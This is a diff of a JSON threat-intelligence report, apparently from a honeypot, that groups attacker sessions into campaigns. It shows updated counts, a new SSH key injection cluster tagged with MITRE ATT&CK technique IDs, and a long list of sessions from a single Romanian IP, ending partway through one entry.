@@ -1,22 +1,36 @@
 {
-  "generated_at": "2026-08-16T01:35:19.697611+00:00",
-  "total_sessions_with_commands": 48,
-  "total_clusters": 3,
-  "campaign_clusters": 1,
-  "singleton_clusters": 0,
-  "highest_severity": "MEDIUM",
+  "generated_at": "2026-08-16T03:03:21.622892+00:00",
+  "total_sessions_with_commands": 139,
+  "total_clusters": 5,
+  "campaign_clusters": 2,
+  "singleton_clusters": 1,
+  "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
       "name": "Recon Loader Script",
       "severity": "MEDIUM",
-      "session_count": 43,
+      "session_count": 117,
       "unique_ip_count": 1,
       "ttps": [
         "T1082",
         "T1592",
         "T1078",
         "T1083"
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1070",
+        "T1140",
+        "T1105"
       ]
     }
   ],
@@ -53,7 +67,7 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 43,
+      "session_count": 117,
       "unique_ips": [
         "193.32.162.15"
       ],
@@ -90,348 +104,940 @@
       ],
       "members": [
         {
-          "session_id": "IR-af0378fc5c7b",
+          "session_id": "IR-008b40db65f7",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:00:30.614986Z"
+          "timestamp": "2026-08-16T00:55:19.907680Z"
         },
         {
-          "session_id": "IR-de1329f51c75",
+          "session_id": "IR-fa33c62b982b",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:02:01.129924Z"
+          "timestamp": "2026-08-16T00:56:39.215096Z"
         },
         {
-          "session_id": "IR-a573e5eda73a",
+          "session_id": "IR-37aa9c24ec4d",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:03:30.018060Z"
+          "timestamp": "2026-08-16T00:57:58.646054Z"
         },
         {
-          "session_id": "IR-dc44aa27ff46",
+          "session_id": "IR-66a1ba9fc54a",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:05:01.194056Z"
+          "timestamp": "2026-08-16T00:59:13.444095Z"
         },
         {
-          "session_id": "IR-8cc20f676c0e",
+          "session_id": "IR-cf6177a84e11",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:06:27.146188Z"
+          "timestamp": "2026-08-16T01:00:27.495103Z"
         },
         {
-          "session_id": "IR-483a4e4636b3",
+          "session_id": "IR-2b345e89655d",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:07:51.086200Z"
+          "timestamp": "2026-08-16T01:01:41.561625Z"
         },
         {
-          "session_id": "IR-593a49ae478a",
+          "session_id": "IR-527b9a23ad53",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:09:13.144675Z"
+          "timestamp": "2026-08-16T01:02:54.876071Z"
         },
         {
-          "session_id": "IR-9cb8ee91b1b5",
+          "session_id": "IR-4a0748ecb7d7",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:10:33.588096Z"
+          "timestamp": "2026-08-16T01:04:08.329592Z"
         },
         {
-          "session_id": "IR-67f218e82c55",
+          "session_id": "IR-d6d0cc089ae3",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:11:52.681382Z"
+          "timestamp": "2026-08-16T01:05:21.144137Z"
         },
         {
-          "session_id": "IR-76481826f827",
+          "session_id": "IR-ae0526886bd5",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:13:10.250904Z"
+          "timestamp": "2026-08-16T01:06:33.429529Z"
         },
         {
-          "session_id": "IR-ecbd0c5f7376",
+          "session_id": "IR-7dade3110fe5",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:14:27.944038Z"
+          "timestamp": "2026-08-16T01:07:46.274061Z"
         },
         {
-          "session_id": "IR-c3f8fa7bd071",
+          "session_id": "IR-db9bf3f4ba69",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:15:43.774653Z"
+          "timestamp": "2026-08-16T01:09:01.553459Z"
         },
         {
-          "session_id": "IR-72b799e758bf",
+          "session_id": "IR-c84f3bab0d27",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:17:02.124303Z"
+          "timestamp": "2026-08-16T01:10:19.931189Z"
         },
         {
-          "session_id": "IR-3e64d722035a",
+          "session_id": "IR-43c7df0f3fea",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:18:20.341128Z"
+          "timestamp": "2026-08-16T01:11:37.964365Z"
         },
         {
-          "session_id": "IR-38c30d2b885b",
+          "session_id": "IR-e862b599df0b",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:19:35.812896Z"
+          "timestamp": "2026-08-16T01:12:51.407392Z"
         },
         {
-          "session_id": "IR-4b46045c9324",
+          "session_id": "IR-81c26cfbe158",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:20:52.685058Z"
+          "timestamp": "2026-08-16T01:14:03.070823Z"
         },
         {
-          "session_id": "IR-6ab537124887",
+          "session_id": "IR-f8ec4f8a21ff",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:22:07.245650Z"
+          "timestamp": "2026-08-16T01:15:13.689662Z"
         },
         {
-          "session_id": "IR-aba7d48da317",
+          "session_id": "IR-0ede850f0c1b",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:23:28.221237Z"
+          "timestamp": "2026-08-16T01:16:24.529485Z"
         },
         {
-          "session_id": "IR-98461b115ee4",
+          "session_id": "IR-c8c1a011ddf5",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:24:46.036112Z"
+          "timestamp": "2026-08-16T01:17:28.859851Z"
         },
         {
-          "session_id": "IR-74d9fb656654",
+          "session_id": "IR-d38332e6aeb8",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:26:03.528955Z"
+          "timestamp": "2026-08-16T01:18:35.585030Z"
         },
         {
-          "session_id": "IR-c3c9b9b558e8",
+          "session_id": "IR-2da2e82c3352",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:27:20.638970Z"
+          "timestamp": "2026-08-16T01:19:41.225482Z"
         },
         {
-          "session_id": "IR-ee4e5cd9dc63",
+          "session_id": "IR-1c37f257ff09",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:28:34.589987Z"
+          "timestamp": "2026-08-16T01:20:45.931324Z"
         },
         {
-          "session_id": "IR-1b8245a03c02",
+          "session_id": "IR-aecbdfed491f",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:29:48.218041Z"
+          "timestamp": "2026-08-16T01:21:50.109642Z"
         },
         {
-          "session_id": "IR-383928e033dc",
+          "session_id": "IR-6ccfdfa85c94",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:31:07.903584Z"
+          "timestamp": "2026-08-16T01:22:56.750271Z"
         },
         {
-          "session_id": "IR-7d67e0af237e",
+          "session_id": "IR-49a18f8d9659",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:32:22.432934Z"
+          "timestamp": "2026-08-16T01:24:04.964601Z"
         },
         {
-          "session_id": "IR-f5d8bca79382",
+          "session_id": "IR-14ec3d9f3d0e",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:33:31.049428Z"
+          "timestamp": "2026-08-16T01:25:14.529122Z"
         },
         {
-          "session_id": "IR-2cf86b4ac1b2",
+          "session_id": "IR-72f2ada47dee",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:34:41.113061Z"
+          "timestamp": "2026-08-16T01:26:22.420159Z"
         },
         {
-          "session_id": "IR-3116da1849ef",
+          "session_id": "IR-74cacd5567ca",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:35:49.511917Z"
+          "timestamp": "2026-08-16T01:27:30.453098Z"
         },
         {
-          "session_id": "IR-bced0f15987b",
+          "session_id": "IR-37660ae9d9a8",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:37:03.848230Z"
+          "timestamp": "2026-08-16T01:28:36.190580Z"
         },
         {
-          "session_id": "IR-2c18cb05d909",
+          "session_id": "IR-17c64aa01511",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:38:17.368985Z"
+          "timestamp": "2026-08-16T01:29:42.917799Z"
         },
         {
-          "session_id": "IR-56aa207a9f87",
+          "session_id": "IR-dc71625cd8a7",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:39:28.109963Z"
+          "timestamp": "2026-08-16T01:30:46.249512Z"
         },
         {
-          "session_id": "IR-6828e0bafd0c",
+          "session_id": "IR-7da570aa216d",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:40:40.745751Z"
+          "timestamp": "2026-08-16T01:31:48.296038Z"
         },
         {
-          "session_id": "IR-0c973cafd49e",
+          "session_id": "IR-772ae8f285e1",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:41:55.587103Z"
+          "timestamp": "2026-08-16T01:32:49.792694Z"
         },
         {
-          "session_id": "IR-1671382d954c",
+          "session_id": "IR-93b675245c1a",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:43:08.764964Z"
+          "timestamp": "2026-08-16T01:33:51.810653Z"
         },
         {
-          "session_id": "IR-a8f60af15f5a",
+          "session_id": "IR-e14820b164d8",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:44:17.829237Z"
+          "timestamp": "2026-08-16T01:34:54.796940Z"
         },
         {
-          "session_id": "IR-1fcf3bd07932",
+          "session_id": "IR-0d5ce14f1a73",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:45:25.769932Z"
+          "timestamp": "2026-08-16T01:36:00.251402Z"
         },
         {
-          "session_id": "IR-85520860c851",
+          "session_id": "IR-3f2969033baa",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:46:33.379883Z"
+          "timestamp": "2026-08-16T01:37:04.927582Z"
         },
         {
-          "session_id": "IR-d2bb595fff49",
+          "session_id": "IR-1f35508f17c5",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:47:45.843269Z"
+          "timestamp": "2026-08-16T01:38:09.547868Z"
         },
         {
-          "session_id": "IR-44832c1bf659",
+          "session_id": "IR-ba31137acbe2",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:48:58.561560Z"
+          "timestamp": "2026-08-16T01:39:14.624666Z"
         },
         {
-          "session_id": "IR-d51cedcf5350",
+          "session_id": "IR-c22102551f96",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:50:16.201800Z"
+          "timestamp": "2026-08-16T01:40:20.016371Z"
         },
         {
-          "session_id": "IR-4e8fd3b104d4",
+          "session_id": "IR-c067fcb70258",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:51:31.837663Z"
+          "timestamp": "2026-08-16T01:41:26.940706Z"
         },
         {
-          "session_id": "IR-9570658b2ae1",
+          "session_id": "IR-07012ea21e13",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:52:48.749466Z"
+          "timestamp": "2026-08-16T01:42:32.986240Z"
         },
         {
-          "session_id": "IR-6cb64fb2c86e",
+          "session_id": "IR-794070a55159",
           "src_ip": "193.32.162.15",
           "country": "RO",
           "isp": "UNMANAGED LTD",
           "command_count": 9,
-          "timestamp": "2026-08-16T00:54:04.477214Z"
+          "timestamp": "2026-08-16T01:43:43.126420Z"
+        },
+        {
+          "session_id": "IR-7ac13bd05e70",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:44:47.892311Z"
+        },
+        {
+          "session_id": "IR-c8f26861e944",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:45:48.022703Z"
+        },
+        {
+          "session_id": "IR-1172aecf9954",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:46:49.930296Z"
+        },
+        {
+          "session_id": "IR-53ef54bf05d6",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:47:48.652260Z"
+        },
+        {
+          "session_id": "IR-54bafa628d57",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:48:51.012962Z"
+        },
+        {
+          "session_id": "IR-029f3198f6ee",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:49:51.427519Z"
+        },
+        {
+          "session_id": "IR-86794600f066",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:50:50.596382Z"
+        },
+        {
+          "session_id": "IR-77a492f8348f",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:51:52.436689Z"
+        },
+        {
+          "session_id": "IR-2d0bd3b132e6",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:52:55.405948Z"
+        },
+        {
+          "session_id": "IR-b5eb2274d6e8",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:53:56.135140Z"
+        },
+        {
+          "session_id": "IR-5b6879479403",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:54:54.261269Z"
+        },
+        {
+          "session_id": "IR-83638ae3d9ee",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:55:52.756186Z"
+        },
+        {
+          "session_id": "IR-8ccd687cae53",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:56:51.031005Z"
+        },
+        {
+          "session_id": "IR-bed1a5409452",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:57:51.841383Z"
+        },
+        {
+          "session_id": "IR-e78403118f0e",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:58:51.033444Z"
+        },
+        {
+          "session_id": "IR-935badeef908",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T01:59:49.156304Z"
+        },
+        {
+          "session_id": "IR-253db689066b",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:00:45.713876Z"
+        },
+        {
+          "session_id": "IR-c6a52a29d230",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:01:46.669821Z"
+        },
+        {
+          "session_id": "IR-ba90d1db1d29",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:02:43.655384Z"
+        },
+        {
+          "session_id": "IR-e6ef9344825e",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:03:39.767863Z"
+        },
+        {
+          "session_id": "IR-a9475be3f53a",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:04:35.540216Z"
+        },
+        {
+          "session_id": "IR-80b85c7c8600",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:05:32.600575Z"
+        },
+        {
+          "session_id": "IR-d6059b556bd7",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:06:29.248578Z"
+        },
+        {
+          "session_id": "IR-87b738014f6f",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:07:26.869892Z"
+        },
+        {
+          "session_id": "IR-81bd3506d659",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:08:22.968944Z"
+        },
+        {
+          "session_id": "IR-031ee94aa2a7",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:09:21.842601Z"
+        },
+        {
+          "session_id": "IR-eee7026838a8",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:10:20.373307Z"
+        },
+        {
+          "session_id": "IR-b57a933f8870",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:11:17.777845Z"
+        },
+        {
+          "session_id": "IR-2ac2c1c0906d",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:12:15.497579Z"
+        },
+        {
+          "session_id": "IR-46246ef96a4f",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:13:12.804873Z"
+        },
+        {
+          "session_id": "IR-41157dbff503",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:14:10.674930Z"
+        },
+        {
+          "session_id": "IR-f817b55ce4ed",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:15:06.576283Z"
+        },
+        {
+          "session_id": "IR-c89e56953b0b",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:16:01.675781Z"
+        },
+        {
+          "session_id": "IR-4e068ea72faf",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:16:57.521552Z"
+        },
+        {
+          "session_id": "IR-874edde333bc",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:17:55.852990Z"
+        },
+        {
+          "session_id": "IR-16bffae06d08",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:18:52.480046Z"
+        },
+        {
+          "session_id": "IR-c542b6a191e2",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:19:46.908309Z"
+        },
+        {
+          "session_id": "IR-1e49856c984d",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:20:44.376157Z"
+        },
+        {
+          "session_id": "IR-2e0846eb4eae",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:21:38.742409Z"
+        },
+        {
+          "session_id": "IR-9aef302f43c5",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:22:34.495088Z"
+        },
+        {
+          "session_id": "IR-95a4e4bf581a",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:23:30.629383Z"
+        },
+        {
+          "session_id": "IR-50e40ba551bb",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:24:27.931798Z"
+        },
+        {
+          "session_id": "IR-fdabdd8f8958",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:25:25.995976Z"
+        },
+        {
+          "session_id": "IR-dc393bcb9da4",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:26:22.869288Z"
+        },
+        {
+          "session_id": "IR-8483a45cff4c",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:27:18.731053Z"
+        },
+        {
+          "session_id": "IR-0e9eabd14902",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:28:15.056067Z"
+        },
+        {
+          "session_id": "IR-ba7c614f44ad",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:29:09.887080Z"
+        },
+        {
+          "session_id": "IR-5c67a960bca2",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:30:03.506166Z"
+        },
+        {
+          "session_id": "IR-1eaf21f7238b",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:30:58.986177Z"
+        },
+        {
+          "session_id": "IR-dc145c22f8fd",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:31:53.234072Z"
+        },
+        {
+          "session_id": "IR-425559011611",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:32:47.956136Z"
+        },
+        {
+          "session_id": "IR-cc7c2061f24b",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:33:44.649818Z"
+        },
+        {
+          "session_id": "IR-571bbe419802",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:34:37.502629Z"
+        },
+        {
+          "session_id": "IR-3f883b6d88dd",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:35:32.065053Z"
+        },
+        {
+          "session_id": "IR-25fe9b616544",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:36:24.782012Z"
+        },
+        {
+          "session_id": "IR-465be7fa70ac",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:37:19.529412Z"
+        },
+        {
+          "session_id": "IR-369c1fcfe2f1",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:38:15.307719Z"
+        },
+        {
+          "session_id": "IR-2f4230acaf6c",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:39:11.951804Z"
+        },
+        {
+          "session_id": "IR-85b48e18ebcb",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:40:07.515891Z"
+        },
+        {
+          "session_id": "IR-23c180e67913",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:41:04.586903Z"
+        },
+        {
+          "session_id": "IR-a07e40ee40b1",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:41:59.383390Z"
+        },
+        {
+          "session_id": "IR-8b5a7b94a872",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:42:55.031411Z"
+        },
+        {
+          "session_id": "IR-3a42a48aaa28",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:43:49.224512Z"
+        },
+        {
+          "session_id": "IR-3aa6438d7d1b",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:44:44.487671Z"
+        },
+        {
+          "session_id": "IR-e20adb5227a1",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:45:39.432690Z"
+        },
+        {
+          "session_id": "IR-eec30b88d238",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
